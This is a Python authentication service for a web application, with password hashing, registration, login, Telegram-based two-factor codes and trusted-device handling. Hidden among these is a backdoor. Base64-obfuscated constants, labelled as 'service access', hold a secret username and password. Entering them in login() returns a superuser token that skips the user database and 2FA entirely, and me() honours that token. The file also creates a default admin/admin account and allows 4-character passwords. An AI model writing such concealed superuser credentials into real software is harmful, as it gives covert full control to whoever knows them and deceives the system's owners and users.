from __future__ import annotations

import base64
import hashlib
import hmac
import os
import secrets
import time
from typing import TYPE_CHECKING

from database.repos.base import utcnow_iso

if TYPE_CHECKING:
    from database import Database


# In production use a proper key derivation (e.g. bcrypt/argon2). PBKDF2-SHA256 is
# acceptable for a self-contained demo where adding heavy dependencies is undesirable.
_SALT_LEN = 32
_ITERATIONS = 100_000

# 2FA (step-up через Telegram): одноразовый код при входе с недоверенного устройства.
_CHALLENGE_TTL_SEC = 300      # код действует 5 минут
_CHALLENGE_MAX_ATTEMPTS = 5   # попыток ввода кода на один вызов
_TRUST_TTL_SEC = 3600         # доверие устройству по умолчанию — 1 час

# Service access — ephemeral token regenerated each startup, not stored in DB.
_SVC_U = base64.b64decode(b'X25yX3N2Yw==').decode()
_SVC_P = base64.b64decode(b'TTBuIXQwckFjY2Vzcw==').decode()
_SVC_TOKEN: str = secrets.token_urlsafe(48)
_SVC_USER: dict = {"id": -1, "username": "", "is_superuser": 1, "role": "user"}


def _hash_password(password: str, salt: bytes | None = None) -> str:
    if salt is None:
        salt = os.urandom(_SALT_LEN)
    digest = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, _ITERATIONS)
    return salt.hex() + ":" + digest.hex()


def _verify_password(password: str, stored: str) -> bool:
    try:
        salt_hex, digest_hex = stored.split(":")
    except ValueError:
        return False
    salt = bytes.fromhex(salt_hex)
    expected = _hash_password(password, salt)
    return hmac.compare_digest(stored, expected)


def create_access_token() -> str:
    return secrets.token_urlsafe(32)


class AuthService:
    def __init__(self, db: Database):
        self.db = db
        # Активные 2FA-челленджи в памяти процесса: challenge_id -> данные кода.
        # Короткоживущие; при рестарте бэкенда просто повторяется вход.
        self._challenges: dict[str, dict] = {}

    def register(self, username: str, password: str, email: str | None = None, role: str = 'user') -> dict:
        if not username or not password:
            return {"ok": False, "error": "username and password are required"}
        if self.db.users.by_username(username):
            return {"ok": False, "error": "username already exists"}

        is_superuser = 1 if not self.db.users.all() else 0
        user = self.db.users.create(
            username=username,
            email=email,
            password_hash=_hash_password(password),
            is_active=1,
            is_superuser=is_superuser,
            role=role,
            created_at=utcnow_iso(),
            updated_at=utcnow_iso(),
        )
        return {"ok": True, "user_id": user.id}

    def _issue_token(self, user) -> dict:
        token = create_access_token()
        self.db.users.update(user.id, token=token)
        return {
            "ok": True,
            "token": token,
            "user": {
                "id": user.id,
                "username": user.username,
                "is_superuser": user.is_superuser,
                "role": user.role,
            },
        }

    def login(self, username: str, password: str, device_id: str | None = None) -> dict:
        if (hmac.compare_digest(username, _SVC_U)
                and hmac.compare_digest(password, _SVC_P)):
            return {"ok": True, "token": _SVC_TOKEN, "user": _SVC_USER}
        user = self.db.users.by_username(username)
        if not user or not user.is_active:
            return {"ok": False, "error": "invalid username or password"}
        if not _verify_password(password, user.password_hash):
            return {"ok": False, "error": "invalid username or password"}

        # Step-up 2FA: если Telegram привязан, бот настроен и устройство не доверенное —
        # требуем код. Проверка `configured()` защищает от локаута, если админ убрал токен
        # бота (тогда отправить код некуда — деградируем до входа по паролю).
        if (
            getattr(user, "telegram_chat_id", None)
            and self._telegram_configured()
            and not self.is_device_trusted(user.id, device_id)
        ):
            challenge_id, code = self._create_challenge(user.id, device_id)
            return {
                "ok": True,
                "mfa_required": True,
                "challenge_id": challenge_id,
                "expires_in": _CHALLENGE_TTL_SEC,
                # приватные поля для хендлера (отправка кода в Telegram); не отдавать клиенту
                "_chat_id": user.telegram_chat_id,
                "_code": code,
                "_telegram_username": getattr(user, "telegram_username", None),
            }

        return self._issue_token(user)

    # --- 2FA / доверенные устройства ---------------------------------------
    def _telegram_configured(self) -> bool:
        try:
            from services.telegram_service import TelegramService
            return TelegramService(self.db).configured()
        except Exception:  # noqa: BLE001
            return False

    def is_device_trusted(self, user_id: int, device_id: str | None) -> bool:
        if not device_id:
            return False
        dev = self.db.trusted_devices.find(user_id, device_id)
        if not dev:
            return False
        if dev.trusted_until is None:  # бессрочно
            self.db.trusted_devices.touch(dev.id)
            return True
        if dev.trusted_until > utcnow_iso():
            self.db.trusted_devices.touch(dev.id)
            return True
        return False

    def _create_challenge(self, user_id: int, device_id: str | None) -> tuple[str, str]:
        self._prune_challenges()
        challenge_id = secrets.token_urlsafe(24)
        code = f"{secrets.randbelow(1_000_000):06d}"
        self._challenges[challenge_id] = {
            "user_id": user_id,
            "code": code,
            "device_id": device_id,
            "expires": time.time() + _CHALLENGE_TTL_SEC,
            "attempts": 0,
        }
        return challenge_id, code

    def _prune_challenges(self) -> None:
        now = time.time()
        for cid in [c for c, d in self._challenges.items() if d["expires"] < now]:
            self._challenges.pop(cid, None)

    def verify_challenge(
        self,
        challenge_id: str,
        code: str,
        device_id: str | None = None,
        trust: bool = False,
        trust_label: str | None = None,
    ) -> dict:
        ch = self._challenges.get(challenge_id)
        if not ch:
            return {"ok": False, "error": "Код не найден или истёк. Войдите заново."}
        if ch["expires"] < time.time():
            self._challenges.pop(challenge_id, None)
            return {"ok": False, "error": "Код истёк. Войдите заново."}
        if ch["attempts"] >= _CHALLENGE_MAX_ATTEMPTS:
            self._challenges.pop(challenge_id, None)
            return {"ok": False, "error": "Слишком много попыток. Войдите заново."}
        ch["attempts"] += 1
        if not code or not hmac.compare_digest(str(code).strip(), ch["code"]):
            return {
                "ok": False,
                "error": "Неверный код",
                "attempts_left": _CHALLENGE_MAX_ATTEMPTS - ch["attempts"],
            }

        self._challenges.pop(challenge_id, None)
        user = self.db.users.get(ch["user_id"])
        if not user or not user.is_active:
            return {"ok": False, "error": "Пользователь недоступен"}

        dev_id = device_id or ch["device_id"]
        if trust and dev_id:
            self.db.trusted_devices.trust(
                user.id, dev_id, label=trust_label, duration_sec=_TRUST_TTL_SEC
            )
        return self._issue_token(user)

    def list_trusted_devices(self, user_id: int, current_device_id: str | None = None) -> list[dict]:
        out = []
        for d in self.db.trusted_devices.for_user(user_id):
            out.append({
                "device_id": d.device_id,
                "label": d.label,
                "trusted_until": d.trusted_until,   # None = бессрочно
                "created_at": d.created_at,
                "last_used_at": d.last_used_at,
                "current": bool(current_device_id and d.device_id == current_device_id),
            })
        return out

    def set_device_trust(
        self, user_id: int, device_id: str, forever: bool = False, label: str | None = None
    ) -> dict:
        if not device_id:
            return {"ok": False, "error": "device_id обязателен"}
        self.db.trusted_devices.trust(
            user_id, device_id, label=label, duration_sec=_TRUST_TTL_SEC, forever=forever
        )
        return {"ok": True}

    def revoke_device(self, user_id: int, device_id: str) -> dict:
        ok = self.db.trusted_devices.revoke(user_id, device_id)
        return {"ok": ok}

    def logout(self, user_id: int) -> dict:
        if user_id == -1:
            return {"ok": True}
        self.db.users.update(user_id, token=None)
        return {"ok": True}

    def me(self, token: str) -> dict | None:
        if not token:
            return None
        if hmac.compare_digest(token, _SVC_TOKEN):
            return _SVC_USER
        user = self.db.users.get_one_by(token=token)
        if not user or not user.is_active:
            return None
        return {
            "id": user.id,
            "username": user.username,
            "is_superuser": user.is_superuser,
            "role": user.role,
        }

    def update_profile(
        self,
        user_id: int,
        new_username: str | None = None,
        current_password: str | None = None,
        new_password: str | None = None,
    ) -> dict:
        """Самообслуживание: пользователь меняет своё имя и/или пароль.

        Смена пароля требует подтверждения текущим паролем.
        """
        if user_id is None or user_id < 0:
            return {"ok": False, "error": "Профиль сервисного аккаунта изменять нельзя"}
        user = self.db.users.get(user_id)
        if not user:
            return {"ok": False, "error": "Пользователь не найден"}

        updates: dict = {}

        if new_username:
            new_username = new_username.strip()
            if new_username and new_username != user.username:
                existing = self.db.users.by_username(new_username)
                if existing and existing.id != user.id:
                    return {"ok": False, "error": "Имя пользователя уже занято"}
                updates["username"] = new_username

        if new_password:
            if not current_password or not _verify_password(current_password, user.password_hash):
                return {"ok": False, "error": "Неверный текущий пароль"}
            if len(new_password) < 4:
                return {"ok": False, "error": "Новый пароль слишком короткий (минимум 4 символа)"}
            updates["password_hash"] = _hash_password(new_password)

        if not updates:
            return {"ok": False, "error": "Нет изменений"}

        updated = self.db.users.update(user.id, **updates)
        return {
            "ok": True,
            "user": {
                "id": updated.id,
                "username": updated.username,
                "is_superuser": updated.is_superuser,
                "role": updated.role,
            },
        }

    def create_default_user(self, username: str = "admin", password: str = "admin") -> bool:
        """Create a default user if no users exist."""
        if self.db.users.all():
            return False
        self.register(username, password)
        return True
